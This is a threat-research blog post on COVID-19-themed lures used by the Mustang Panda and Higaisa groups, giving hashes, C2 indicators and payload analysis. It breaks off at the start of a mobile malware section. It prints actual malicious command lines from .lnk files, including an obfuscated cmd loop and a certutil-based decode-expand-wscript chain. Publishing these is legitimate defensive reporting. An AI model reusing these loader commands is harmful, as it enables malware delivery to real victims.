March 23, 2020-Anomali Threat Research,COVID-19 Themes Are Being Utilized by Threat Actors of Varying SophisticationResearch<p><em>Authored by: Gage Mele, Parthiban R., and Tara Gould</em></p><h3>The Tactics, Techniques and Procedures (TTPs) Are Known but the Content Is Coronavirus-Themed</h3><h2>Overview</h2><p>Threat actors are utilizing the global spread of COVID-19 (Coronavirus) to conduct malicious activity. As the world responds to this threat in various ways, actors are attempting to use the chaos to their advantage. COVID-19 is being weaponized for scare tactics by threat actors for conducting malicious activity utilizing different Tactics, Techniques, and Procedures (TTPs). While the majority of observations made by Anomali Threat Research (ATR) are commodity (purchasable and widely distributed) campaigns and malware. ATR identified that the Higaisa and Mustang Panda Advanced Persistent Threat (APT) groups have been utilizing Coronavirus-themed lures in their campaigns.</p><p>In addition to machine-targeted campaigns, ATR also identified COVID-19-themes targeting Android mobile devices. One of the samples is utilizing a fully functional Coronavirus infection-tracking application while the SpyNote Remote Access Trojan (RAT) runs in the background. Another is a phishing campaign that uses a fake Adobe Flash update and COVID-19 related URLs to install the Cerberus banking trojan. While some of these malware are commodity and may be more obvious malicious attempts, actors will likely continue to abuse these themes to install various malware families, some of which will be discussed below.</p><h2>Details</h2><p>The current activity being reported on open sources consists of threat actors using COVID-19 as part of phishing campaigns, both in email subject and content as well as attachments.<sup>[1]</sup> These kind of virus-themed campaigns began almost immediately after the 41 cases of COVID-19 were reported on by the World Health Organization on December 31, 2019.<sup>[2]</sup> By January and February 2020, Coronavirus-themed lures were widespread with assistance from the Emotet botnet.<sup>[3]</sup> The malware used in these campaigns can vary because many distribution methods are offered for purchase and utilized by numerous actors, however, there have been some instances of Advanced Persistent Threat (APT) actors attempting to capitalize on the COVID-19 outbreak.</p><p>In mid-March 2020, Check Point Research published their findings regarding a campaign targeting the Mongolian public sector utilizing Coronavirus-themed lure documents.<sup>[4]</sup> This RTF activity also coincides with RTF activity identified by ATR.<sup>[5]</sup> APTs frequently use relevant themes as lures, and ATR has also identified such groups attempting to capitalize on Coronavirus-related events.</p><h2>APT Activity</h2><p>ATR observed a campaign beginning in late February through mid-March 2020, that we believe is being conducted by the China-based APT group, Mustang Panda. The group is utilizing decoy documents related to COVID-19 to target Taiwan and Vietnam. Mustang Panda is continuing to use Cobalt Strike and PlugX RAT as their final payloads. This activity aligns with Mustang Panda TTPs previously identified by ATR.<sup>[6]</sup></p><h2>Lure Documents</h2><p><strong>Document title</strong> - 02-21-1.docx</p><p><strong>Hash</strong> - 6d994c64c17ce50cbb333c8b4bcbd8e0</p><p style="text-align: center;"><em><strong><img alt="Chen Chien-jen Facebook Discussion" src="https://cdn.filestackcontent.com/uygM4gr8S5SXzbVienvd"/><br/> Figure 1</strong> - Chen Chien-jen Facebook Discussion</em></p><p>The document file above is describing a post on Facebook written by Chen Chien-jen, current Vice President of the Republic of China and former Vice President of Taiwanese research institution, Academia Sinica. The post discusses community transition [of Coronavirus] and the United States’ (US) Centers for Disease Control (CDC) listing of countries for it, specifically Taiwan. Taiwan’s Foreign Ministry subsequently demanded removal from said listing.</p><p><strong>Document title</strong> - 03-01-1.docx</p><p><strong>Hash</strong> - 7f0a1bdde14ea1f3085b43bdadcfb146</p><p style="text-align: center;"><em><strong><img alt="COVID-19 Questions" src="https://cdn.filestackcontent.com/F3mexsJeRa6uoPeqwMFH"/><br/> Figure 2</strong> - COVID-19 Questions</em></p><p>Figure 2 contains text that was translated to English, likely from Chinese due to Mustang Panda being China-based, because of the spelling and grammar errors that would be uncommon for a native speaker. The text poses questions about neutralizing COVID-19 with varying levels of sophistication.</p><p><strong>Document title</strong> - Chi Thi cua thu tuong nguyen xuan phuc.doc</p><p><strong>Hash</strong> - 13d61974d2db537bdb0504cfc53b74a7</p><p style="text-align: center;"><em><strong><img alt="Vietnamese Government Meeting Article from March 3, 2020" src="https://cdn.filestackcontent.com/RLzDfxvnTBOFLYCNC7B4"/><br/> Figure 3</strong> - Vietnamese Government Meeting Article from March 3, 2020</em></p><p>The document in Figure 3 is an article discussing a meeting held by Vietnamese Prime Minister Nguyen Xuan Phuc that was held on March 3, 2020. Other government officials attending the meeting spoke of unity in these times and how approximately 3,000 have been placed in isolation and are under the care of the army. Other topics include overall Coronavirus prevention measures and updates on travel restrictions. The article is publicly available at www.cantho.gov[.]vn, and was likely taken by Mustang Panda from this source as observed by ATR in previous campaigns conducted by the group.</p><h2>Technical Analysis</h2><p>The above mentioned three RAR (compressed files) files each contain a Windows Shortcut (.lnk) file. The .lnk files being utilized by Mustang Panda typically contain an embedded HTA file with VBscript, once executed, will drop and open the decoy document while the malicious activity of the payload runs in the background. ATR observed PlugX and Cobalt Strike being delivered as the primary payloads throughout the campaign.</p><h3>.lnk files</h3><p style="text-align: center;"><em><strong>Table 1</strong> - .lnk file metadata</em></p><table class="table table-striped" style="table-layout: fixed;"><tbody><tr><th style="word-wrap: break-word;">FileMD5</th><th style="word-wrap: break-word;">LinkModifiedDate</th><th style="word-wrap: break-word;">FileSize</th><th style="word-wrap: break-word;">NameString</th><th style="word-wrap: break-word;">CommandLineArgs</th><th style="word-wrap: break-word;">NetBios Name</th><th style="word-wrap: break-word;">MAC Address</th></tr><tr><td style="word-wrap: break-word;">FC00964131A8C9407BA77484E724FC9D</td><td style="word-wrap: break-word;">7/14/2009 1:14</td><td style="word-wrap: break-word;">301568</td><td style="word-wrap: break-word;">02-21-1.lnk</td><td style="word-wrap: break-word;">/c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f delims==" %i in ('dir "%x-21-1.lnk" /s /b') do start %TEMP:~-2</td><td style="word-wrap: break-word;">win-67od36i8f4c</td><td style="word-wrap: break-word;">00:0C:29:50:2D:E6</td></tr><tr><td style="word-wrap: break-word;">0F794D6C6646A260558E9D638AE060C9</td><td style="word-wrap: break-word;">7/14/2009 1:14</td><td style="word-wrap: break-word;">301568</td><td style="word-wrap: break-word;">03-01-1.lnk</td><td style="word-wrap: break-word;">/c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f delims==" %i in ('dir "%x-01-1.lnk" /s /b') do start %TEMP:~-2</td><td style="word-wrap: break-word;">cia-at28--planc</td><td style="word-wrap: break-word;">00:0C:29:50:2D:E6</td></tr><tr><td style="word-wrap: break-word;">A4B7FE08900074B6A103D2CF36730421</td><td style="word-wrap: break-word;">11/21/2010 3:24</td><td style="word-wrap: break-word;">302592</td><td style="word-wrap: break-word;">Chi Thi cua thu tuong nguyen xuan phuc.lnk</td><td style="word-wrap: break-word;">/c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f delims==" %i in ('dir "%xChi Thi cua thu tuong nguyen xuan phuc.lnk" /s /b') do start %TEMP:~-2</td><td style="word-wrap: break-word;">win-gnhs1vcenrt</td><td style="word-wrap: break-word;">AA:50:18:7E:EB:82</td></tr></tbody></table><h3>Payload Analysis</h3><p>Mustang Panda has used the well known adversary emulation tool called Cobalt Strike as the final payload for the following samples <strong>02-21-1.lnk</strong> and <strong>03-01-1.lnk</strong>. The group has utilized the malleable Command and Control (C2) feature in Cobalt Strike tool to mask the malicious traffic behind a legitimate DNS request to code.jquery.com. The samples mentioned above use 123.51.185[.]75 as their final C2.</p><p>Two notable changes from Mustang Panda previous campaigns identified by ATR are:</p><ul><li>Change in directory <strong>C:UsersPublicMusic</strong> where the payload is dropped</li><li>Usage of the legitimate executable <strong>tencentsoso.exe</strong> that is used for DLL side loading</li></ul><p>The sample <strong>Chi Thi cua thu tuong nguyen xuan phuc.lnk</strong> uses <strong>PlugX</strong> as its final payload. Once executed it drops three files in the directory<strong> C:ProgramDataMicrosoft Malware Protectionydy</strong>. The <strong>unescapp.exe</strong> is a legitimate executable that is signed by “ESET, spol. s r.o.” and it is being abused for DLL hijacking technique to execute http_dll.dll which decodes and loads the malicious payload http_dll.dat. Upon execution of the payload it reaches out to the C2 domain vietnam[.]zing[.]photos and it resolves to 104.160.44[.]85.</p><p style="text-align: center;"><em><strong><img alt="Dropped File Location" src="https://cdn.filestackcontent.com/RXEMSlWiTSiqbrIp0Rgd"/><br/> Figure 4</strong> - Dropped File Location</em></p><p>ATR attributes this activity to Mustang Panda based on the TTPs, targeted countries, and usage of malware families that all have been previously attributed to the group.<sup>[7]</sup></p><h2>Higaisa Activity</h2><p>Covid.pdf.lnk - 21a51a834372ab11fba72fb865d6830e</p><p>On March 15, 2020, ATR identified a malicious .lnk file that utilizes an infection chain similar to other known APT groups. This campaign was found to use C2 infrastructure that overlaps with the Korea-based APT group, Higaisia. The lure document, dropped by the .lnk file, was downloaded from the World Health Organization website, and is likely being used to target English-speaking individuals and entities.</p><p>The .lnk uses a multi stage process to deliver a decory PDF document (Figure 5) and the final payload PlugX and it reaches out to C2 motivation[.]neighboring[.]site and it resolves to 69.172.75[.]223. PlugX is a Remote Access Trojan (RAT) that is commonly used by China-based threat actors.</p><p style="text-align: center;"><em><strong><img alt="World Health Organization Situation Report" src="https://cdn.filestackcontent.com/s7AuHINcQlisMpNyC09n"/><br/> Figure 5</strong> - World Health Organization Situation Report</em></p><h3>Technical Analysis</h3><p>The .lnk file contains an embedded blob of base64 encoded content. Inspecting the .lnk metadata, it appears that the actor has modified them, for example the following fields have been tampered, creation time, Machine ID and MAC address as shown in Figure 6.</p><p style="text-align: center;"><em><strong><img alt=".lnk Metadata" src="https://cdn.filestackcontent.com/eqfWi7L2SbiWLTAI3p0H"/><br/> Figure 6</strong> - .lnk Metadata</em></p><p>Upon execution of the .lnk file, the following commands were run in the background,</p><pre> /c copy "20200308-sitrep-48-covid-19.pdf.lnk" %tmp%\g4ZokyumBB2gDn.tmp /y&amp; for /r C:\Windows\System32\ %i in (*ertu*.exe) do copy %i %tmp%\msoia.exe /y&amp; findstr.exe "TVNDRgAAAA" %tmp%\g4ZokyumBB2gDn.tmp&gt;%tmp%\cSi1r0uywDNvDu.tmp&amp;%tmp%\ msoia.exe -decode %tmp%\cSi1r0uywDNvDu.tmp %tmp%\oGhPGUDC03tURV.tmp&amp; expand %tmp%\oGhPGUDC03tURV.tmp -F:* %tmp% &amp; wscript %tmp%\9sOXN6Ltf0afe7.js</pre><p>The file cSi1r0uywDNvDu.tmp is a <strong>Windows cabinet</strong> (.cab) file.

Upon its execution it loads the file <strong>oinfo12.ocx</strong> (.dll) and it further loads and executes <strong>wordcnvpxy.exe</strong> (PlugX). The malware reaches out to the C2 URL motivation[.]neighboring[.]site/01/index.php.</p><p>Figure 9 and 10 below depicts the overlapping evidence, as mentioned above. The C2 IP, 69.172.75[.]223, was previously used by Higaisa and reported on in late February, 2020.<sup>[9]</sup></p><p style="text-align: center;"><em><strong><img alt="Higaisa C2 Overlap" src="https://cdn.filestackcontent.com/ajDr1oOwS5mDVpgKZYTu"/><br/> Figure 9</strong> - Higaisa C2 Overlap</em></p><p style="text-align: center;"><em><strong><img alt="Higaisa Sample Communication to IP" src="https://cdn.filestackcontent.com/2sT6sKDuRiqyJkJYds6e"/><br/> Figure 10</strong> - Higaisa Sample Communication to IP (https://community.riskiq.com/search/69.172.75.223)</em></p><h2>Mobile Malware</h2><p><strong>APK title</strong> - Avist.apk</p><p><strong>Hash</strong> - 107169ae6951a5cba57d2a0cd274e28fadf5c73d73e91a386f15cf4dc35edd38</p><p>This Android application is fully-functional and will update overall COVID-19 statistics as a normal application would.
